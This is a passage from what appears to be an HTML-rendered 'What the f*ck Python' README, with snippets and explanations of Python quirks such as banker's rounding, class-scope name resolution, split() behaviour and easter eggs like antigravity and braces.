[5,6,7,8]&lt;/code&gt; generates a new list and sets &lt;code&gt;a&lt;/code&gt;&#39;s reference to that new list, leaving &lt;code&gt;b&lt;/code&gt; unchanged.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The expression &lt;code&gt;a += [5,6,7,8]&lt;/code&gt; is actually mapped to an &#34;extend&#34; function that operates on the list such that &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; still point to the same list that has been modified in-place.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Name resolution ignoring class scope&lt;/h3&gt; &#xA;&lt;!-- Example ID: 03f73d96-151c-4929-b0a8-f74430788324 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;x = 5&#xA;class SomeClass:&#xA;    x = 17&#xA;    y = (x for i in range(10))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; list(SomeClass.y)[0]&#xA;5&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;x = 5&#xA;class SomeClass:&#xA;    x = 17&#xA;    y = [x for i in range(10)]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; SomeClass.y[0]&#xA;17&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 3.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; SomeClass.y[0]&#xA;5&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Scopes nested inside class definition ignore names bound at the class level.&lt;/li&gt; &#xA; &lt;li&gt;A generator expression has its own scope.&lt;/li&gt; &#xA; &lt;li&gt;Starting from Python 3.X, list comprehensions also have their own scope.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Rounding like a banker *&lt;/h3&gt; &#xA;&lt;p&gt;Let&#39;s implement a naive function to get the middle element of a list:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def get_middle(some_list):&#xA;    mid_index = round(len(some_list) / 2)&#xA;    return some_list[mid_index - 1]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Python 3.x:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; get_middle([1])  # looks good&#xA;1&#xA;&amp;gt;&amp;gt;&amp;gt; get_middle([1,2,3])  # looks good&#xA;2&#xA;&amp;gt;&amp;gt;&amp;gt; get_middle([1,2,3,4,5])  # huh?&#xA;2&#xA;&amp;gt;&amp;gt;&amp;gt; len([1,2,3,4,5]) / 2  # good&#xA;2.5&#xA;&amp;gt;&amp;gt;&amp;gt; round(len([1,2,3,4,5]) / 2)  # why?&#xA;2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It seems as though Python rounded 2.5 to 2.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;This is not a float precision error, in fact, this behavior is intentional. Since Python 3.0, &lt;code&gt;round()&lt;/code&gt; uses &lt;a href=&#34;https://en.wikipedia.org/wiki/Rounding#Round_half_to_even&#34;&gt;banker&#39;s rounding&lt;/a&gt; where .5 fractions are rounded to the nearest &lt;strong&gt;even&lt;/strong&gt; number:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; round(0.5)&#xA;0&#xA;&amp;gt;&amp;gt;&amp;gt; round(1.5)&#xA;2&#xA;&amp;gt;&amp;gt;&amp;gt; round(2.5)&#xA;2&#xA;&amp;gt;&amp;gt;&amp;gt; import numpy  # numpy does the same&#xA;&amp;gt;&amp;gt;&amp;gt; numpy.round(0.5)&#xA;0.0&#xA;&amp;gt;&amp;gt;&amp;gt; numpy.round(1.5)&#xA;2.0&#xA;&amp;gt;&amp;gt;&amp;gt; numpy.round(2.5)&#xA;2.0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;This is the recommended way to round .5 fractions as described in &lt;a href=&#34;https://en.wikipedia.org/wiki/IEEE_754#Rounding_rules&#34;&gt;IEEE 754&lt;/a&gt;. However, the other way (round away from zero) is taught in school most of the time, so banker&#39;s rounding is likely not that well known. Furthermore, some of the most popular programming languages (for example: JavaScript, Java, C/C++, Ruby, Rust) do not use banker&#39;s rounding either. Therefore, this is still quite special to Python and may result in confusion when rounding fractions.&lt;/li&gt; &#xA; &lt;li&gt;See the &lt;a href=&#34;https://docs.python.org/3/library/functions.html#round&#34;&gt;round() docs&lt;/a&gt; or &lt;a href=&#34;https://stackoverflow.com/questions/10825926/python-3-x-rounding-behavior&#34;&gt;this stackoverflow thread&lt;/a&gt; for more information.&lt;/li&gt; &#xA; &lt;li&gt;Note that &lt;code&gt;get_middle([1])&lt;/code&gt; only returned 1 because the index was &lt;code&gt;round(0.5) - 1 = 0 - 1 = -1&lt;/code&gt;, returning the last element in the list.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Needles in a Haystack *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 52a199b1-989a-4b28-8910-dff562cebba9 ---&gt; &#xA;&lt;p&gt;I haven&#39;t met even a single experience Pythonist till date who has not come across one or more of the following scenarios,&lt;/p&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;x, y = (0, 1) if True else None, None&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x, y  # expected (0, 1)&#xA;((0, 1), None)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;t = (&#39;one&#39;, &#39;two&#39;)&#xA;for i in t:&#xA;    print(i)&#xA;&#xA;t = (&#39;one&#39;)&#xA;for i in t:&#xA;    print(i)&#xA;&#xA;t = ()&#xA;print(t)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;one&#xA;two&#xA;o&#xA;n&#xA;e&#xA;tuple()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;ten_words_list = [&#xA;    &#34;some&#34;,&#xA;    &#34;very&#34;,&#xA;    &#34;big&#34;,&#xA;    &#34;list&#34;,&#xA;    &#34;that&#34;&#xA;    &#34;consists&#34;,&#xA;    &#34;of&#34;,&#xA;    &#34;exactly&#34;,&#xA;    &#34;ten&#34;,&#xA;    &#34;words&#34;&#xA;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; len(ten_words_list)&#xA;9&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;4. Not asserting strongly enough&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;a = &#34;python&#34;&#xA;b = &#34;javascript&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# An assert statement with an assertion failure message.&#xA;&amp;gt;&amp;gt;&amp;gt; assert(a == b, &#34;Both languages are different&#34;)&#xA;# No AssertionError is raised&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;5.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;some_list = [1, 2, 3]&#xA;some_dict = {&#xA;  &#34;key_1&#34;: 1,&#xA;  &#34;key_2&#34;: 2,&#xA;  &#34;key_3&#34;: 3&#xA;}&#xA;&#xA;some_list = some_list.append(4) &#xA;some_dict = some_dict.update({&#34;key_4&#34;: 4})&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(some_list)&#xA;None&#xA;&amp;gt;&amp;gt;&amp;gt; print(some_dict)&#xA;None&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;6.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def some_recursive_func(a):&#xA;    if a[0] == 0:&#xA;        return&#xA;    a[0] -= 1&#xA;    some_recursive_func(a)&#xA;    return a&#xA;&#xA;def similar_recursive_func(a):&#xA;    if a == 0:&#xA;        return a&#xA;    a -= 1&#xA;    similar_recursive_func(a)&#xA;    return a&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_recursive_func([5, 0])&#xA;[0, 0]&#xA;&amp;gt;&amp;gt;&amp;gt; similar_recursive_func(5)&#xA;4&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;For 1, the correct statement for expected behavior is &lt;code&gt;x, y = (0, 1) if True else (None, None)&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;For 2, the correct statement for expected behavior is &lt;code&gt;t = (&#39;one&#39;,)&lt;/code&gt; or &lt;code&gt;t = &#39;one&#39;,&lt;/code&gt; (missing comma) otherwise the interpreter considers &lt;code&gt;t&lt;/code&gt; to be a &lt;code&gt;str&lt;/code&gt; and iterates over it character by character.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;()&lt;/code&gt; is a special token and denotes empty &lt;code&gt;tuple&lt;/code&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;In 3, as you might have already figured out, there&#39;s a missing comma after 5th element (&lt;code&gt;&#34;that&#34;&lt;/code&gt;) in the list. So by implicit string literal concatenation,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; ten_words_list&#xA;[&#39;some&#39;, &#39;very&#39;, &#39;big&#39;, &#39;list&#39;, &#39;thatconsists&#39;, &#39;of&#39;, &#39;exactly&#39;, &#39;ten&#39;, &#39;words&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;No &lt;code&gt;AssertionError&lt;/code&gt; was raised in 4th snippet because instead of asserting the individual expression &lt;code&gt;a == b&lt;/code&gt;, we&#39;re asserting entire tuple. The following snippet will clear things up,&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; a = &#34;python&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; b = &#34;javascript&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; assert a == b&#xA;Traceback (most recent call last):&#xA;    File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;AssertionError&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; assert (a == b, &#34;Values are not equal&#34;)&#xA;&amp;lt;stdin&amp;gt;:1: SyntaxWarning: assertion is always true, perhaps remove parentheses?&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; assert a == b, &#34;Values are not equal&#34;&#xA;Traceback (most recent call last):&#xA;    File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;AssertionError: Values are not equal&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;As for the fifth snippet, most methods that modify the items of sequence/mapping objects like &lt;code&gt;list.append&lt;/code&gt;, &lt;code&gt;dict.update&lt;/code&gt;, &lt;code&gt;list.sort&lt;/code&gt;, etc. modify the objects in-place and return &lt;code&gt;None&lt;/code&gt;. The rationale behind this is to improve performance by avoiding making a copy of the object if the operation can be done in-place (Referred from &lt;a href=&#34;https://docs.python.org/3/faq/design.html#why-doesn-t-list-sort-return-the-sorted-list&#34;&gt;here&lt;/a&gt;).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Last one should be fairly obvious, mutable object (like &lt;code&gt;list&lt;/code&gt;) can be altered in the function, and the reassignment of an immutable (&lt;code&gt;a -= 1&lt;/code&gt;) is not an alteration of the value.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Being aware of these nitpicks can save you hours of debugging effort in the long run.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Splitsies *&lt;/h3&gt; &#xA;&lt;!-- Example ID: ec3168ba-a81a-4482-afb0-691f1cc8d65a ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &#39;a&#39;.split()&#xA;[&#39;a&#39;]&#xA;&#xA;# is same as&#xA;&amp;gt;&amp;gt;&amp;gt; &#39;a&#39;.split(&#39; &#39;)&#xA;[&#39;a&#39;]&#xA;&#xA;# but&#xA;&amp;gt;&amp;gt;&amp;gt; len(&#39;&#39;.split())&#xA;0&#xA;&#xA;# isn&#39;t the same as&#xA;&amp;gt;&amp;gt;&amp;gt; len(&#39;&#39;.split(&#39; &#39;))&#xA;1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;It might appear at first that the default separator for split is a single space &lt;code&gt;&#39; &#39;&lt;/code&gt;, but as per the &lt;a href=&#34;https://docs.python.org/3/library/stdtypes.html#str.split&#34;&gt;docs&lt;/a&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;If sep is not specified or is &lt;code&gt;None&lt;/code&gt;, a different splitting algorithm is applied: runs of consecutive whitespace are regarded as a single separator, and the result will contain no empty strings at the start or end if the string has leading or trailing whitespace. Consequently, splitting an empty string or a string consisting of just whitespace with a None separator returns &lt;code&gt;[]&lt;/code&gt;. If sep is given, consecutive delimiters are not grouped together and are deemed to delimit empty strings (for example, &lt;code&gt;&#39;1,,2&#39;.split(&#39;,&#39;)&lt;/code&gt; returns &lt;code&gt;[&#39;1&#39;, &#39;&#39;, &#39;2&#39;]&lt;/code&gt;). Splitting an empty string with a specified separator returns &lt;code&gt;[&#39;&#39;]&lt;/code&gt;.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA; &lt;li&gt;Noticing how the leading and trailing whitespaces are handled in the following snippet will make things clear, &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &#39; a &#39;.split(&#39; &#39;)&#xA;[&#39;&#39;, &#39;a&#39;, &#39;&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; &#39; a &#39;.split()&#xA;[&#39;a&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; &#39;&#39;.split(&#39; &#39;)&#xA;[&#39;&#39;]&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Wild imports *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 83deb561-bd55-4461-bb5e-77dd7f411e1c ---&gt; &#xA;&lt;!-- read-only --&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# File: module.py&#xA;&#xA;def some_weird_name_func_():&#xA;    print(&#34;works!&#34;)&#xA;&#xA;def _another_weird_name_func():&#xA;    print(&#34;works!&#34;)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; from module import *&#xA;&amp;gt;&amp;gt;&amp;gt; some_weird_name_func_()&#xA;&#34;works!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; _another_weird_name_func()&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;NameError: name &#39;_another_weird_name_func&#39; is not defined&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;It is often advisable to not use wildcard imports. The first obvious reason for this is, in wildcard imports, the names with a leading underscore don&#39;t get imported. This may lead to errors during runtime.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Had we used &lt;code&gt;from ... import a, b, c&lt;/code&gt; syntax, the above &lt;code&gt;NameError&lt;/code&gt; wouldn&#39;t have occurred.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; from module import some_weird_name_func_, _another_weird_name_func&#xA;&amp;gt;&amp;gt;&amp;gt; _another_weird_name_func()&#xA;works!&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;If you really want to use wildcard imports, then you&#39;d have to define the list &lt;code&gt;__all__&lt;/code&gt; in your module that will contain a list of public objects that&#39;ll be available when we do wildcard imports.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;__all__ = [&#39;_another_weird_name_func&#39;]&#xA;&#xA;def some_weird_name_func_():&#xA;    print(&#34;works!&#34;)&#xA;&#xA;def _another_weird_name_func():&#xA;    print(&#34;works!&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;&lt;strong&gt;Output&lt;/strong&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; _another_weird_name_func()&#xA;&#34;works!&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; some_weird_name_func_()&#xA;Traceback (most recent call last):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1, in &amp;lt;module&amp;gt;&#xA;NameError: name &#39;some_weird_name_func_&#39; is not defined&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ All sorted? *&lt;/h3&gt; &#xA;&lt;!-- Example ID: e5ff1eaf-8823-4738-b4ce-b73f7c9d5511 --&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = 7, 8, 9&#xA;&amp;gt;&amp;gt;&amp;gt; sorted(x) == x&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; sorted(x) == sorted(x)&#xA;True&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; y = reversed(x)&#xA;&amp;gt;&amp;gt;&amp;gt; sorted(y) == sorted(y)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The &lt;code&gt;sorted&lt;/code&gt; method always returns a list, and comparing lists and tuples always returns &lt;code&gt;False&lt;/code&gt; in Python.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; [] == tuple()&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; x = 7, 8, 9&#xA;&amp;gt;&amp;gt;&amp;gt; type(x), type(sorted(x))&#xA;(tuple, list)&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Unlike &lt;code&gt;sorted&lt;/code&gt;, the &lt;code&gt;reversed&lt;/code&gt; method returns an iterator. Why? Because sorting requires the iterator to be either modified in-place or use an extra container (a list), whereas reversing can simply work by iterating from the last index to the first.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;So during comparison &lt;code&gt;sorted(y) == sorted(y)&lt;/code&gt;, the first call to &lt;code&gt;sorted()&lt;/code&gt; will consume the iterator &lt;code&gt;y&lt;/code&gt;, and the next call will just return an empty list.&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = 7, 8, 9&#xA;&amp;gt;&amp;gt;&amp;gt; y = reversed(x)&#xA;&amp;gt;&amp;gt;&amp;gt; sorted(y), sorted(y)&#xA;([7, 8, 9], [])&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Midnight time doesn&#39;t exist?&lt;/h3&gt; &#xA;&lt;!-- Example ID: 1bce8294-5619-4d70-8ce3-fe0bade690d1 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;from datetime import datetime&#xA;&#xA;midnight = datetime(2018, 1, 1, 0, 0)&#xA;midnight_time = midnight.time()&#xA;&#xA;noon = datetime(2018, 1, 1, 12, 0)&#xA;noon_time = noon.time()&#xA;&#xA;if midnight_time:&#xA;    print(&#34;Time at midnight is&#34;, midnight_time)&#xA;&#xA;if noon_time:&#xA;    print(&#34;Time at noon is&#34;, noon_time)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;lt; 3.5):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;(&#39;Time at noon is&#39;, datetime.time(12, 0))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The midnight time is not printed.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;p&gt;Before Python 3.5, the boolean value for &lt;code&gt;datetime.time&lt;/code&gt; object was considered to be &lt;code&gt;False&lt;/code&gt; if it represented midnight in UTC. It is error-prone when using the &lt;code&gt;if obj:&lt;/code&gt; syntax to check if the &lt;code&gt;obj&lt;/code&gt; is null or some equivalent of &#34;empty.&#34;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Section: The Hidden treasures!&lt;/h2&gt; &#xA;&lt;p&gt;This section contains a few lesser-known and interesting things about Python that most beginners like me are unaware of (well, not anymore).&lt;/p&gt; &#xA;&lt;h3&gt;▶ Okay Python, Can you make me fly?&lt;/h3&gt; &#xA;&lt;!-- Example ID: a92f3645-1899-4d50-9721-0031be4aec3f ---&gt; &#xA;&lt;p&gt;Well, here you go&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;import antigravity&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt; Sshh... It&#39;s a super-secret.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;antigravity&lt;/code&gt; module is one of the few easter eggs released by Python developers.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;import antigravity&lt;/code&gt; opens up a web browser pointing to the &lt;a href=&#34;https://xkcd.com/353/&#34;&gt;classic XKCD comic&lt;/a&gt; about Python.&lt;/li&gt; &#xA; &lt;li&gt;Well, there&#39;s more to it. There&#39;s &lt;strong&gt;another easter egg inside the easter egg&lt;/strong&gt;. If you look at the &lt;a href=&#34;https://github.com/python/cpython/raw/master/Lib/antigravity.py#L7-L17&#34;&gt;code&lt;/a&gt;, there&#39;s a function defined that purports to implement the &lt;a href=&#34;https://xkcd.com/426/&#34;&gt;XKCD&#39;s geohashing algorithm&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ &lt;code&gt;goto&lt;/code&gt;, but why?&lt;/h3&gt; &#xA;&lt;!-- Example ID: 2aff961e-7fa5-4986-a18a-9e5894bd89fe ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;from goto import goto, label&#xA;for i in range(9):&#xA;    for j in range(9):&#xA;        for k in range(9):&#xA;            print(&#34;I am trapped, please rescue!&#34;)&#xA;            if k == 2:&#xA;                goto .breakout # breaking out from a deeply nested loop&#xA;label .breakout&#xA;print(&#34;Freedom!&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python 2.3):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;I am trapped, please rescue!&#xA;I am trapped, please rescue!&#xA;Freedom!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;A working version of &lt;code&gt;goto&lt;/code&gt; in Python was &lt;a href=&#34;https://mail.python.org/pipermail/python-announce-list/2004-April/002982.html&#34;&gt;announced&lt;/a&gt; as an April Fool&#39;s joke on 1st April 2004.&lt;/li&gt; &#xA; &lt;li&gt;Current versions of Python do not have this module.&lt;/li&gt; &#xA; &lt;li&gt;Although it works, but please don&#39;t use it. Here&#39;s the &lt;a href=&#34;https://docs.python.org/3/faq/design.html#why-is-there-no-goto&#34;&gt;reason&lt;/a&gt; to why &lt;code&gt;goto&lt;/code&gt; is not present in Python.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Brace yourself!&lt;/h3&gt; &#xA;&lt;!-- Example ID: 5c0c75f2-ddd9-4da3-ba49-c4be7ec39acf ---&gt; &#xA;&lt;p&gt;If you are one of the people who doesn&#39;t like using whitespace in Python to denote scopes, you can use the C-style {} by importing,&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;from __future__ import braces&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;  File &#34;some_file.py&#34;, line 1&#xA;    from __future__ import braces&#xA;SyntaxError: not a chance&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Braces? No way! If you think that&#39;s disappointing, use Java. Okay, another surprising thing, can you find where&#39;s the &lt;code&gt;SyntaxError&lt;/code&gt; raised in &lt;code&gt;__future__&lt;/code&gt; module &lt;a href=&#34;https://github.com/python/cpython/raw/master/Lib/__future__.py&#34;&gt;code&lt;/a&gt;?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The &lt;code&gt;__future__&lt;/code&gt; module is normally used to provide features from future versions of Python. The &#34;future&#34; in this specific context is however, ironic.&lt;/li&gt; &#xA; &lt;li&gt;This is an easter egg concerned with the community&#39;s feelings on this issue.&lt;/li&gt; &#xA; &lt;li&gt;The code is actually present &lt;a href=&#34;https://github.com/python/cpython/raw/025eb98dc0c1dc27404df6c544fc2944e0fa9f3a/Python/future.c#L49&#34;&gt;here&lt;/a&gt; in &lt;code&gt;future.c&lt;/code&gt; file.&lt;/li&gt; &#xA; &lt;li&gt;When the CPython compiler encounters a &lt;a href=&#34;https://docs.python.org/3.3/reference/simple_stmts.html#future-statements&#34;&gt;future statement&lt;/a&gt;, it first runs the appropriate code in &lt;code&gt;future.c&lt;/code&gt; before treating it as a normal import statement.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Let&#39;s meet Friendly Language Uncle For Life&lt;/h3&gt; 